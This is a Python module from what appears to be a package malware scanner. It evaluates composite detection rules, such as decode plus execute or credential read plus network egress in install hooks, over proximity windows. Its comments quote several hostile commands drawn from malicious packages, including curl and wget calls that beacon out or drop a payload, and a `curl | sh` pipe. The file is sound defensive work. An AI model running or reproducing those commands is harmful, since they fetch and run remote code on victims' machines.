"""Composite reasoning: whether a file's capability hits satisfy a composite rule, and over which window.

A composite names capabilities that must occur together -- decode *and* execute, read a credential *and*
reach the network -- optionally within a proximity, in an execution context, or on a path. The
evaluator answers that for one file at a time: the hits that satisfy a rule (a window, found pairwise
or, past a hit count, densely), and the rule's expression evaluated term by term against what is
present. A file's own place in the package (an install entry, an import entry) is part of what a
term can ask, so each file gets its own evaluator holding it."""

from __future__ import annotations

from collections import Counter
from contextlib import suppress
from typing import TYPE_CHECKING, ClassVar

from cordon_scanner.detect.code.capability.build_output import BuildOutput
from cordon_scanner.detect.code.capability.hits import CapabilityHit, LineRanges
from cordon_scanner.foundation.capabilities import Capability

if TYPE_CHECKING:
    from typing import Any

    from cordon_scanner.foundation.content import FileContent
    from cordon_scanner.rules.pack import CompiledRule


class CompositeEvaluator:
    """One file's composite evaluation: windows, expressions and terms."""

    def __init__(self, *, in_entry: bool = False, in_import_entry: bool = False) -> None:
        #: The file is an install hook's own entry (the `install_entry` term).
        self.in_entry = in_entry
        #: The file is a published package's entry point, run on `require()`/`import` (REC-2).
        self.in_import_entry = in_import_entry

    @staticmethod
    def satisfying_region(content: FileContent, hits: list[CapabilityHit]) -> bytes:
        """The bytes the composite actually matched across, plus a margin.

        A window around the ANCHOR is the wrong region to look in. The anchor is one
        of several hits and not necessarily the fetch: in Elasticsearch's
        `setup_node.sh` the anchor landed 400 bytes away from the `curl`, so the pin in
        the URL was outside the window and the file was still called malware.

        The composite matched because a SET of hits sat close enough together, so that
        set is the region any statement about the match has to be made over.
        """
        if not hits:
            return b""
        start = min(hit.byte_start for hit in hits)
        end = max(hit.byte_end for hit in hits)
        return content.raw[max(0, start - 200) : end + 200]

    BYTES_PER_LINE = 200
    """How far apart in bytes `proximity` lines are allowed to be.

    Proximity is a line count, and a minifier deletes lines. On a bundle the
    whole file is line 1, so "within five lines" means "anywhere in the file"
    and a composite that was written to say *this file does both things in the
    same breath* silently becomes *this file does both things*.

    `ethers`, the most used Ethereum library there is, showed this: two hits at
    line 1 of `dist/ethers.min.js`, thousands of bytes apart, reported as
    private key material sent to the network at CRITICAL. And a MALICIOUS
    composite is deliberately exempt from the minified ceiling -- malware is not
    excused for being generated -- so nothing downstream would have caught it.

    Two hundred bytes a line is generous for real source, where the mean is
    nearer forty, so this never narrows a window on code somebody wrote by hand.
    What it does is stop a window from spanning a bundle."""

    MAX_PROXIMITY_HITS = 400
    """Above this many capability hits, the pairwise search gives way to `CompositeEvaluator._dense_window`.

    The search is quadratic in the number of hits, and a file with four hundred of them is
    generated or enormous. It used to fall back to file scope there -- reporting more, on the
    theory that more is safe -- which made every large bundle a single window."""

    def satisfying_window(
        self,
        compiled: CompiledRule,
        hits: list[CapabilityHit],
        path: str,
        in_hook: bool,
        in_ci: bool,
        in_consumer: bool = False,
        deferred: frozenset[tuple[int, int]] = frozenset(),
    ) -> list[CapabilityHit] | None:
        """The hits that satisfy this composite, or `None` if none do.

        With no `proximity` the window is the whole file, which is what every
        composite meant before proximity existed. With one, the capabilities
        must appear within that many lines of each other -- so a claim that a
        file fetches and executes becomes a claim that one *part* of it does,
        which is what the message has always said.
        """
        proximity = compiled.match.proximity
        if (
            proximity > 0
            and in_hook
            and hits
            and (
                max(h.line for h in hits) <= self.SMALL_HOOK_LINES
                # Lines of ordinary length: a minified bundle's 300 lines are a whole library.
                and max(h.byte_start for h in hits) <= 160 * self.SMALL_HOOK_LINES
                # And written by hand: an editor extension's compiled entry is a bundle whose
                # first hundred lines hold unrelated libraries (review 98: about twenty Open VSX
                # AI-coding extensions read as one install-time act).
                and not BuildOutput.bundled_path(path)
            )
        ):
            # An install script a few hundred lines long runs top to bottom, and its parts are one
            # act: `@testcarrot/supply6` reads the username in one function and writes it to a raw
            # socket from another 25 lines below, past a 30-line window (review 98). Proximity
            # separates the halves of a library; it does not separate the halves of a hook.
            proximity = 0
        if proximity <= 0:
            if self._evaluate_over(
                compiled, hits, path, in_hook, in_ci, in_consumer, deferred, all_hits=hits
            ):
                return hits
            return None
        if len(hits) > self.MAX_PROXIMITY_HITS:
            return self._dense_window(
                compiled, hits, path, in_hook, in_ci, in_consumer, deferred, proximity
            )

        # Sorted by line ALONE, and stably. Adding `byte_start` to the key looks
        # harmless and is not: a window is `ordered[index:]`, so it drops every
        # hit that sorts earlier, and the AST tier's `fixed` marker sits on the
        # same line as the pattern hit it qualifies. Reordering the two put the
        # marker behind the window, `fixed_lines` came out empty, and
        # `subprocess.run(["git", "rev-parse", "HEAD"])` -- an argv written out
        # in full -- satisfied `SUSPECT.DECODE_EXEC.001` again. The existing
        # test for it is what caught this.
        ordered = sorted(hits, key=lambda h: h.line)
        byte_limit = proximity * self.BYTES_PER_LINE
        for index, first in enumerate(ordered):
            limit = first.line + proximity
            window = [
                h
                for h in ordered[index:]
                if h.line <= limit and abs(h.byte_start - first.byte_start) <= byte_limit
            ]
            if self._evaluate_over(
                compiled, window, path, in_hook, in_ci, in_consumer, deferred, all_hits=hits
            ):
                return window
        return None

    SMALL_HOOK_LINES: ClassVar[int] = 300
    """Install-time code whose every capability sits within this many lines is one window."""

    def _dense_window(
        self,
        compiled: CompiledRule,
        hits: list[CapabilityHit],
        path: str,
        in_hook: bool,
        in_ci: bool,
        in_consumer: bool,
        deferred: frozenset[tuple[int, int]],
        proximity: int,
    ) -> list[CapabilityHit] | None:
        """Proximity over a file with more hits than the pairwise search affords.

        The file used to be one window past `MAX_PROXIMITY_HITS`, which in a bundle means any
        credential read and any request anywhere in ten megabytes are "together": a 27 MB agent
        extension's secret-redaction table (`hooks.slack.com/<redacted>`) and its help text
        (`"Read(~/.zshrc)"`) were blocked as malware (review 98). Here each hit is the centre of
        the bytes within `proximity * BYTES_PER_LINE` either side, found by bisection over the
        hits sorted by offset -- symmetric, so a marker that sorts just before its pattern hit is
        still in the window -- and a window identical to the last is not evaluated twice.
        """
        import bisect

        byte_limit = proximity * self.BYTES_PER_LINE
        by_byte = sorted(hits, key=lambda h: h.byte_start)
        starts = [h.byte_start for h in by_byte]
        last: tuple[int, int] | None = None
        for centre in by_byte:
            lo = bisect.bisect_left(starts, centre.byte_start - byte_limit)
            hi = bisect.bisect_right(starts, centre.byte_start + byte_limit)
            if (lo, hi) == last:
                continue
            last = (lo, hi)
            window = [h for h in by_byte[lo:hi] if abs(h.line - centre.line) <= proximity]
            if self._evaluate_over(
                compiled, window, path, in_hook, in_ci, in_consumer, deferred, all_hits=hits
            ):
                return window
        return None

    def _evaluate_over(
        self,
        compiled: CompiledRule,
        window: list[CapabilityHit],
        path: str,
        in_hook: bool,
        in_ci: bool,
        in_consumer: bool = False,
        deferred: frozenset[tuple[int, int]] = frozenset(),
        *,
        all_hits: list[CapabilityHit] | None = None,
    ) -> bool:
        all_hits = window if all_hits is None else all_hits
        window = CompositeEvaluator._fixed_argv_window(all_hits, window)
        # The file runs at install time; this window has to as well. If any hit
        # in it sits in a body the hooks never call, the pair the composite
        # describes is not something that happens during an install -- so the
        # `context: install_hook` term is not satisfied for THIS window, even
        # though it is for the file.
        #
        # `any` rather than `all`: the claim is that these capabilities occur
        # together during an install, and one half of the pair sitting in dead
        # code is enough for that not to be true.
        if in_hook and deferred and any(LineRanges.cls_in(hit.line, deferred) for hit in window):
            in_hook = False

        present = {hit.capability for hit in window}
        counts: Counter[Capability] = Counter()
        for hit in window:
            if not hit.resolved:
                counts[hit.capability] += hit.variants
        fired = frozenset(hit.rule_id for hit in window)
        return self.evaluate(compiled, present, path, in_hook, counts, fired, in_ci, in_consumer)

    @staticmethod
    def _fixed_argv_window(
        all_hits: list[CapabilityHit], window: list[CapabilityHit]
    ) -> list[CapabilityHit]:
        """The window without the spawns whose whole argv is written out: they run a fixed program, and count only where nothing else speaks for the composite."""
        # A spawn whose whole argv is written out in the source does not count.
        #
        # Every composite that names `spawn` uses it as evidence that something
        # unknown runs -- decoded data, a downloaded file, a credential's worth of
        # harvested output. `subprocess.run(["git", "rev-parse", "--short", "HEAD"])`
        # cannot be any of those: what it runs is in the file, in front of the
        # reader.
        #
        # `NousResearch/hermes-agent` produced eleven `SUSPECT.DECODE_EXEC.001`
        # anchored on exactly that shape -- `["ldd", "--version"]`, `["launchctl",
        # "list", label]`, `["git", "rev-parse"]` -- each paired with a base64
        # decode somewhere else in the file. Across the corpus `SUSPECT.DECODE_EXEC
        # .001` was 684 findings in 252 of 1,487 repositories.
        #
        # What keeps the real cases is that a constant argv is ANALYSED rather than
        # trusted: `os.system("curl x | sh")` is constant too, and the embedded-shell
        # tier extracts the fetch and the pipe from it as capabilities of their own,
        # which satisfy the composite on their own terms. And a constant command
        # naming a temporary or relative path is not treated as fixed at all, because
        # that is where a dropper puts its payload.
        # By LINE, not by hit. The pattern tier and the AST tier both see the same
        # call -- `CAP.PY.SPAWN.001@222` and `AST.PY.SPAWN@222` -- and only the AST
        # tier can say whether the argv was written out, so dropping its own hit
        # alone left the pattern tier's to satisfy the term anyway.
        # Unless the argv that was written out is ITSELF the act. The discount rests
        # on one claim -- that a spawn whose whole command is visible cannot be
        # running something decoded or downloaded -- and that claim holds for
        # `subprocess.run(["git", "rev-parse", "--short", "HEAD"])` and fails
        # completely for `os.system("curl https://kotko.me/analyze.php?procoder")`.
        # Both are fully literal. In the second the literal is the attack, and being
        # readable is not the same as being harmless.
        #
        # So a line whose command carried a capability of its own keeps its spawn.
        # `CAP.SH.*` is the marker for that: those hits exist only because the shell
        # rules were applied to the command string a spawn was handed, so one on this
        # line means the argv itself fetches, decodes or persists.
        #
        # Measured. `procoder`'s `setup.py` is `os.system("curl <url>")` and nothing
        # else; the spawn was discounted, only `egress` survived, and
        # `MALWARE.DROPPER.001` needs both -- so an install-time beacon in four lines
        # of Python produced no finding. Six of the packages still missed after the
        # reconnaissance work were this shape, `duc193`'s
        # `os.system("wget -O ~/.mal/.neofetch.py <url>")` among them.
        #
        # Computed over every hit in the FILE rather than over the window, and
        # that is load-bearing rather than tidy. "This line's argv is written
        # out in full" is a fact about the line; which window happens to be
        # under evaluation cannot change it. Scoping it to the window made the
        # discount depend on hit ORDER, because a window is `ordered[index:]`
        # and drops everything sorting earlier -- so a window starting at a
        # spawn hit that sorted after the `fixed` marker on the same line
        # contained no marker at all, `fixed_lines` came out empty, and the
        # discount silently did not apply.
        #
        # This is the second time that shape has bitten. The comment on
        # `ordered` records the first: adding `byte_start` to the sort key
        # reordered the marker behind the window and `subprocess.run(["git",
        # "rev-parse", "--short", "HEAD"])` satisfied `SUSPECT.DECODE_EXEC.001`
        # again. It was fixed by preserving the order, which left the real
        # fragility in place -- appending any new spawn-labelling tier after
        # the marker reproduced it exactly, and adding the `ast` match kind
        # did. Taking the fact from the file removes the ordering dependency
        # instead of restating the rule that protects it.
        speaking_argv = {
            hit.line
            for hit in all_hits
            if hit.rule_id.startswith("CAP.SH.") and hit.capability is not Capability.SPAWN
        }
        fixed_lines = {hit.line for hit in all_hits if hit.fixed} - speaking_argv
        return [
            hit
            for hit in window
            if not (hit.capability is Capability.SPAWN and hit.line in fixed_lines)
        ]

    def evaluate(
        self,
        compiled: CompiledRule,
        present: set[Capability],
        path: str,
        in_hook: bool = False,
        counts: Counter[Capability] | None = None,
        fired: frozenset[str] = frozenset(),
        in_ci: bool = False,
        in_consumer: bool = False,
    ) -> bool:
        """Evaluate a composite expression against the capabilities present.

        Supports ``all``, ``any``, nested combinations, and ``unless``. Kept
        deliberately small: a composite rule is read by somebody deciding whether
        a security finding is justified, and an expression language rich enough
        to be clever is one nobody can review.
        """
        match = compiled.match
        counts = counts if counts is not None else Counter(present)

        if match.all_of and not all(
            self._term(
                term,
                present,
                path=path,
                in_hook=in_hook,
                in_ci=in_ci,
                in_consumer=in_consumer,
                counts=counts,
                fired=fired,
            )
            for term in match.all_of
        ):
            return False
        if match.any_of and not any(
            self._term(
                term,
                present,
                path=path,
                in_hook=in_hook,
                in_ci=in_ci,
                in_consumer=in_consumer,
                counts=counts,
                fired=fired,
            )
            for term in match.any_of
        ):
            return False
        return not any(
            self._term(
                term,
                present,
                path=path,
                in_hook=in_hook,
                in_ci=in_ci,
                in_consumer=in_consumer,
                counts=counts,
                fired=fired,
            )
            for term in match.unless
        )

    def _term(
        self,
        term: object,
        present: set[Capability],
        *,
        path: str | None = None,
        in_hook: bool = False,
        in_ci: bool = False,
        in_consumer: bool = False,
        counts: Counter[Capability] | None = None,
        fired: frozenset[str] = frozenset(),
    ) -> bool:
        if not isinstance(term, dict):
            return False

        if "capability" in term:
            try:
                capability = Capability(str(term["capability"]))
            except ValueError:
                return False
            required = term.get("at_least")
            if required is None:
                return capability in present
            # Depth, not presence. `decode` twice in one file is a decode
            # chain -- base64 into decompress into execute -- and that is a
            # stronger claim than decoding once, because a single decode has
            # ordinary uses and stacking them has none.
            observed = (counts or Counter(present))[capability]
            return observed >= int(required)

        # A named indicator rather than a capability.
        #
        # Some evidence is not a behaviour, it is a destination: posting to a
        # Discord webhook and posting to a metrics endpoint are both `egress`,
        # and the capability model deliberately cannot tell them apart. This
        # term lets a composite say "that specific rule fired" without
        # inventing a capability for every indicator, which is what would
        # otherwise happen and would dilute the primitives until they meant
        # nothing.
        if "rule" in term:
            return str(term["rule"]) in fired

        return self._compound_term(counts, fired, in_ci, in_consumer, in_hook, path, present, term)

    def _compound_term(
        self,
        counts: Counter[Capability] | None,
        fired: frozenset[str],
        in_ci: bool,
        in_consumer: bool,
        in_hook: bool,
        path: str | None,
        present: set[Capability],
        term: dict[Any, Any],
    ) -> bool:
        """A compound or contextual term: any or all of its parts, a negation, a path glob, or an execution context."""
        if "any" in term:
            return any(
                self._term(
                    t,
                    present,
                    path=path,
                    in_hook=in_hook,
                    in_ci=in_ci,
                    in_consumer=in_consumer,
                    counts=counts,
                    fired=fired,
                )
                for t in term["any"] or ()
            )

        if "all" in term:
            return all(
                self._term(
                    t,
                    present,
                    path=path,
                    in_hook=in_hook,
                    in_ci=in_ci,
                    in_consumer=in_consumer,
                    counts=counts,
                    fired=fired,
                )
                for t in term["all"] or ()
            )

        # The negation of a term.
        #
        # `unless` already refuses a composite by path, and that is the only
        # thing this model could say "not" about. The case that needed more:
        # `SUSPECT.DECODE_EXEC.001` pairs a decode with a process start, and in
        # shell every command is a process -- so `key=$(echo "$b" | base64 -d)`,
        # which is how a shell script decodes anything at all, matched a rule
        # whose message says the decoded value was executed. The primitive is
        # right and it is not evidence of that claim in that one language, which
        # is a statement about a specific capability rule rather than about a
        # path or a context.
        if "not" in term:
            return not self._term(
                term["not"],
                present,
                path=path,
                in_hook=in_hook,
                in_ci=in_ci,
                in_consumer=in_consumer,
                counts=counts,
                fired=fired,
            )

        return self._context_term(in_ci, in_consumer, in_hook, path, term)

    def _context_term(
        self, in_ci: bool, in_consumer: bool, in_hook: bool, path: str | None, term: dict[Any, Any]
    ) -> bool:
        """A term about where or when code runs: a path glob over the package, or an execution context (install hook, CI, consumer install, entry points)."""
        if "path_glob" in term and path is not None:
            from cordon_scanner.foundation.files.globs import PathGlob

            entry = self.in_entry or self.in_import_entry
            return not entry and PathGlob.in_package(path, str(term["path_glob"]))

        # Execution context as a first-class term.
        #
        # This is what lets a rule say "credential access plus network egress,
        # in an install hook" without also requiring an execution primitive. In
        # application code that pairing needs a third signal to be meaningful,
        # because reading configuration and calling an API is what an
        # application does all day. In an install hook it does not: the hook IS
        # the execution, so the pair alone is already the whole attack.
        if "context" in term:
            named = str(term["context"])
            if named == "install_hook":
                return in_hook
            if named == "ci_hook":
                return in_ci
            if named == "consumer_install":
                return in_consumer
            if named == "install_entry":
                return in_hook and self.in_entry
            if named == "import_entry":
                return self.in_import_entry
            return False

        return False

    @staticmethod
    def capabilities_of(compiled: CompiledRule) -> tuple[Capability, ...]:
        """Every capability named anywhere in a composite expression."""
        found: list[Capability] = []

        def walk(term: object) -> None:
            if not isinstance(term, dict):
                return
            if "capability" in term:
                with suppress(ValueError):
                    found.append(Capability(str(term["capability"])))
            for key in ("all", "any"):
                for nested in term.get(key) or ():
                    walk(nested)

        for term in (*compiled.match.all_of, *compiled.match.any_of):
            walk(term)
        return tuple(dict.fromkeys(found))


__all__ = ["CompositeEvaluator"]
